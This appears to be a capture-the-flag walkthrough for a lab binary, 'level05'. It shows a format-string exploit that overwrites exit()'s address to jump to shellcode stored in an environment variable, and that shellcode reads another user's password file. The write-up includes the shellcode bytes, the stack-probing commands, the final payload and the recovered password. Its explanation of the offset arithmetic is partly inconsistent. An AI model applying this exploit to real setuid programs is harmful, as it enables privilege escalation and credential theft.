# Level05

> For introductory information on this operating system and binary securities, check [here](./analysis.md).

Using [`gdb`](https://linux.die.net/man/1/gdb), we can dig through the binary to understand what's going on (full analysis [here](./gdb.md)). This time we'll use a format string attack to inject a Shellcode at some existing address, here a `exit()` call at address `0x0804 97e0`.

```shell
  export SHELLCODE=$(python -c "print '\x90' * 1000 + '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass'")
```

> This shellcode was found [here](http://shell-storm.org/shellcode/files/shellcode-73.php) and basically read a file and output its content to standard input.

We'll need to find our input on the stack first:

```shell
 $> (python -c "print 'aaaa' + ' | %x' * 16") | ./level05 
  aaaa | 64 | f7fcfac0 | f7ec3af9 | ffffd2bf | ffffd2be | 0 | ffffffff | ffffd344 | f7fdb000 | 61616161 | 25207c20 | 207c2078 | 7c207825 | 20782520 | 7825207c | 25207c20
```

> `aaaa` is equal to `61616161` in hexadecimal. As we can see, there, our format string is the 10th argument on the stack.

Last step would be to get the actual address of that shellcode in our environment, using the following small program.

```C
  #include <stdio.h>
  #include <stdlib.h>

  int main(int argc, char** argv)
  {
    printf("env address at %p\n", getenv(argv[1]));
    return (0);
  }
```

Finally piece everything together... To make our life easier, we'll split our attack in two part so that overriding the whole address of `exit()` will be faster. We'll override high order bytes first at `exit()` address and low order bytes at `exit()` address + **2**.

```shell
  $> python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%<LOWER_BYTES_OFFSET>c%10$hn" + "%<HIGHER_BYTES_OFFSET>c%11$hn"' | ./level05
  ...
  h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```

> For example, let's say our shellcode is at adress `0x673f92b6`.
>
> `LOWER_BYTES_OFFSET` is computed as follow: Shellcode lower bytes (`0x92b6` => **37558**) - already printed bytes (address of `exit()` + adress of `exit()`+ **2** => **8**). So **37550**.
>
> `HIGHER_BYTES_OFFSET` is computed as follow: `0xffff` - `LOWER_BYTES_OFFSET` - **8** => **65535** - **37558** - **8** = **27969**

So next user credentials pair is `level06:h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq`.

Check [here](../source.c) for reproduction source-code of this binary.